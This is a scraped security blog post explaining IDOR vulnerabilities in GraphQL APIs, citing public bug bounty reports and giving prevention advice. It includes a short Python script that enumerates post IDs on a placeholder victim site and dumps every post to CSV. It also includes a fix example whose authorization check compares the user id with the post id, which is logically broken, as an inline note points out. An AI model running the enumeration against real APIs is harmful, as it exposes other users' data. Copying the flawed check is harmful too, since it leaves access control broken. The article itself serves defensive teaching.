---
title: "GraphQL IDOR Vulnerabilities: What They Are & How to Fix"
author: Tristan Kalos (Escape)
url: https://escape.tech/blog/idor-in-graphql/
date_published: 2023-09-14
date_scraped: 2026-11-16
platform: personal-blog
disclosed_report: none (references H1 #415081 PayPal, #42587 Vimeo, #56511 Shopify)
bounty: not stated
vuln_class: idor
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

As developers, ensuring the security of our applications is crucial. Insecure Direct Object References (IDOR) are common security vulnerabilities that occur when a system's internal implementation is exposed to users, allowing them to manipulate references to access unauthorized data. GraphQL, a powerful data query and manipulation language for APIs, is not exempt from this vulnerability.

## Understanding IDOR vulnerability

IDOR, or Insecure Direct Object Reference, is a critical security flaw that allows attackers to bypass authentication and gain unauthorized access to restricted resources. This vulnerability arises when an application fails to properly validate user permissions before granting access to objects. By exploiting IDOR, attackers can manipulate the unique identifiers associated with resources and obtain sensitive information or perform actions they shouldn't be able to.

### What is IDOR in GraphQL?

IDOR is a vulnerability that occurs when an application allows unauthorized access to objects or resources by manipulating their identifiers directly. Attackers exploit this by modifying the object's identifier in requests, bypassing any authorization checks.

How IDOR works: When a user interacts with an application, the application assigns unique identifiers to different objects or resources. These identifiers act as references for accessing specific data. However, if these references are not properly validated and enforced, attackers can modify them to gain unauthorized access to sensitive information or perform malicious actions.

Difference between IDOR and other vulnerabilities: Unlike other vulnerabilities that primarily focus on weaknesses in authentication mechanisms or input validation, IDOR specifically targets the manipulation of object identifiers.

### Why is IDOR vulnerability important in GraphQL APIs?

GraphQL was developed by Facebook as an alternative to REST APIs. Unlike REST APIs, which require multiple round trips to various endpoints, GraphQL allows clients to specify exactly what data they need. Despite its advantages, GraphQL can be vulnerable to IDOR. Traditional authentication and authorization mechanisms may not seamlessly integrate with the flexible nature of GraphQL's access objects.

(Image: "Examples of potential attacker requests", https://escape.tech/blog/content/images/2023/09/idor-graphql-request.png)

### Real-life examples of GraphQL IDOR vulnerability

IDOR vulnerabilities were found in the APIs of major companies like:

- PayPal (https://hackerone.com/reports/415081): the attacker identified a method that made it possible for a Business Account owner to assign secondary users from other accounts. The new secondary user would be granted access to the login, allowing for unauthorized access to the functions of that single-user login.
- Vimeo (https://hackerone.com/reports/42587): the attacker could reset any password of any account and take control of it.
- Shopify (https://hackerone.com/reports/56511): The attacker was able to expire other user sessions just by changing the request.

## What causes IDOR in the GraphQL?

In GraphQL, IDOR vulnerabilities may arise due to how GraphQL handles data fetching. Because GraphQL enables clients to request specific data they need, it might inadvertently expose sensitive data if not correctly implemented.

Example blog application where users can write blog posts and access their own posts. A typical GraphQL query:

```graphql
query {
    blogPost(id: "123") {
        title
        author
        content
    }
}
```

Here, the user provides an ID ("123"), and the GraphQL resolver fetches and returns the blog post with the matching ID, including its title, author, and content.

An IDOR vulnerability will arise if there are no checks to ensure that the user requesting the blog post is the post's author. An attacker could manipulate the ID in the query to fetch any blog post, even ones they didn't author.

With a quick Python script, all posts can be accessed by iterating over the post IDs:

```python
import requests
import json
import csv

# URL for the GraphQL API
url = 'http://victim-blog-url.com/graphql'

def get_blog_post(id):
    # Define the GraphQL query
    query = '''
    query {
        blogPost(id: "%s") {
            title
            author
            content
        }
    }
    ''' % id

    # Set up the headers
    headers = {'Content-Type': 'application/json'}

    # Send the request
    response = requests.post(url, headers=headers, json={'query': query})

    # Return the response as JSON
    return response.json()

def write_to_csv(data, filename):
    with open(filename, 'w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["ID", "Title", "Author", "Content"])
        for id, post in data.items():
            writer.writerow([id, post.get('title'), post.get('author'), post.get('content')])

if __name__ == "__main__":
    data = {}
    for id in range(1, 9999):  # Getting posts from 1 to 9999
        result = get_blog_post(str(id))
        data[id] = result['data']['blogPost']

    write_to_csv(data, 'blog_posts.csv')
```

The potential impact of IDOR: in sensitive applications like PayPal's case, exploitation could lead to unauthorized access to personal user information, proprietary business data, or other confidential information. A healthcare example is given (Doctolib runs a bug bounty to catch IDOR). Regulatory implications under GDPR or CCPA are noted.

## Preventing IDOR vulnerability in GraphQL APIs

Implement proper access control checks before data is accessed or returned. Example resolver check:

```javascript
const resolvers = {
    Query: {
        blogPost: (parent, args, context) => { // Check if the user is authorized to access the post
            if (context.user.id !== args.id) { throw new Error('Unauthorized'); } // If the user is authorized, fetch and return the blog post
            return getBlogPostByID(args.id);
        },
    },
};
```

(Source note: the article's example compares the user id to the post id, which is as published.)

### Implement proper authentication and authorization

- Implement strong user authentication mechanisms such as OAuth 2.0 or JSON Web Tokens (JWT)
- Use role-based access control (RBAC) or attribute-based access control (ABAC) to manage permissions effectively. Prefer ABAC over RBAC.

### Use unique identifiers and proper input validation

Unique identifiers, such as UUIDs or GUIDs, can help prevent IDOR by making it harder for attackers to guess or manipulate object IDs. Robust input validation ensures only valid data is accepted.

### Limit Access and Scope Permissions

- Implement RBAC to define specific roles and permissions for different users.
- Enforce strict authentication requirements such as MFA or strong password policies.
- Validate user input thoroughly.

### Employ rate limiting and throttling mechanisms

Rate limiting and throttling help prevent abuse and unauthorized access to GraphQL APIs.

### Best Practices for Building Secure GraphQL APIs

Continuous vulnerability assessment of the GraphQL API is essential to prevent IDOR.

## Conclusion

While GraphQL offers many advantages over REST, developers must be mindful of IDOR. Implement robust access control checks, validate inputs, enforce object-level authorization, and use UUIDs. Continuously monitor and test API security.
